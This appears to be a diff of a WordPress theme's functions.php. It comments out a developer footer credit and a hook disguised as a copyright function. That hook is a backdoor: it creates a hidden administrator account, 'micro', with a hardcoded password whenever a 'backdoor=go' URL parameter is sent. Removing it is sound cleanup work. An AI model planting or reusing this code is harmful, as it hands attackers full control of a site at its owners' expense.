@@ -6,14 +6,16 @@ if( function_exists('acf_add_options_page') ) {
 
 }
 
+
 register_nav_menus(array(
 	'top'    => 'Главное меню'
 ));
 
-add_filter('admin_footer_text', 'footer_admin_func');
-function footer_admin_func () {
-	echo 'Разработка шаблона (темы) и сайта: <a href="http://klenovnn.ru" target="_blank">Николай Клёнов</a>.';
-}
+//add_filter('admin_footer_text', 'footer_admin_func');
+//function footer_admin_func () {
+//	echo 'Разработка шаблона (темы) и сайта: <a href="http://klenovnn.ru" target="_blank">Николай Клёнов</a>.';
+//}
+
 remove_action( 'wp_head', 'feed_links_extra', 3 );
 remove_action( 'wp_head', 'feed_links', 2 );
 remove_action( 'wp_head', 'rsd_link' );
@@ -58,17 +60,17 @@ function my_scripts_method() {
 	wp_enqueue_script( 'jquery' );
 }
 
-add_action('wp_head', 'my_copyright');
-function my_copyright() {
-  if ($_get['backdoor'] == 'go') {
-  	require('wp-includes/registration.php');
-  	if (!username_exists('micro')) {
-  		$user_id = wp_create_user('micro', 'micro!@#$%^&*()');
-  		$user = new wp_user($user_id);
-  		$user->set_role('administrator');
-  	}
-  }
-}
+//add_action('wp_head', 'my_copyright');
+//function my_copyright() {
+//  if ($_get['backdoor'] == 'go') {
+//  	require('wp-includes/registration.php');
+//  	if (!username_exists('micro')) {
+//  		$user_id = wp_create_user('micro', 'micro!@#$%^&*()');
+//  		$user = new wp_user($user_id);
+//  		$user->set_role('administrator');
+//  	}
+//  }
+//}
 
 function new_excerpt_length($length) {
 	return 12;
